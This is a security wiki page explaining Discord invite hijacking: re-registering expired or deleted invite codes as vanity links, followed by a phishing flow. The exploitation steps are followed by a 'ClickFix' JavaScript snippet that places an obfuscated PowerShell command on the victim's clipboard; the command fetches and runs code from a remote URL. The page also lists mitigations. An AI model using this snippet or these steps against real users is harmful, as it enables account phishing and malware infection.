# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord’s invite system vulnerability allows threat actors to claim expired or deleted invite codes (temporary, permanent, or custom vanity) as new vanity links on any Level 3 boosted server. By normalizing all codes to lowercase, attackers can pre-register known invite codes and silently hijack traffic once the original link expires or the source server loses its boost.

## Invite Types and Hijack Risk

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | After expiration, the code becomes available and can be re-registered as a vanity URL by a boosted server. |
| Permanent Invite Link | ⚠️          | If deleted and consisting only of lowercase letters and digits, the code may become available again.        |
| Custom Vanity Link    | ✅          | If the original server loses its Level 3 Boost, its vanity invite becomes available for new registration.    |

## Exploitation Steps

1. Reconnaissance
   - Monitor public sources (forums, social media, Telegram channels) for invite links matching the pattern `discord.gg/{code}` or `discord.com/invite/{code}`.
   - Collect invite codes of interest (temporary or vanity).
2. Pre-registration
   - Create or use an existing Discord server with Level 3 Boost privileges.
   - In **Server Settings → Vanity URL**, attempt to assign the target invite code. If accepted, the code is reserved by the malicious server.
3. Hijack Activation
   - For temporary invites, wait until the original invite expires (or manually delete it if you control the source).
   - For uppercase-containing codes, the lowercase variant can be claimed immediately, though redirection only activates after expiration.
4. Silent Redirection
   - Users visiting the old link are seamlessly sent to the attacker-controlled server once the hijack is active.

## Phishing Flow via Discord Server

1. Restrict server channels so only a **#verify** channel is visible.
2. Deploy a bot (e.g., **Safeguard#0786**) to prompt newcomers to verify via OAuth2.
3. Bot redirects users to a phishing site (e.g., `captchaguard.me`) under the guise of a CAPTCHA or verification step.
4. Implement the **ClickFix** UX trick:
   - Display a broken CAPTCHA message.
   - Guide users to open the **Win+R** dialog, paste a preloaded PowerShell command, and press Enter.

### ClickFix Clipboard Injection Example

```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
            `$u=($r[-1..-($r.Length)]-join '');` +
            `$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
            `iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```

This approach avoids direct file downloads and leverages familiar UI elements to lower user suspicion.

## Mitigations

- Use permanent invite links containing at least one uppercase letter or non-alphanumeric character (never expire, non-reusable).
- Regularly rotate invite codes and revoke old links.
- Monitor Discord server boost status and vanity URL claims.
- Educate users to verify server authenticity and avoid executing clipboard-pasted commands.

## References

- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
- Discord Custom Invite Link Documentation – https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link

{{#include /src/banners/hacktricks-training.md}}
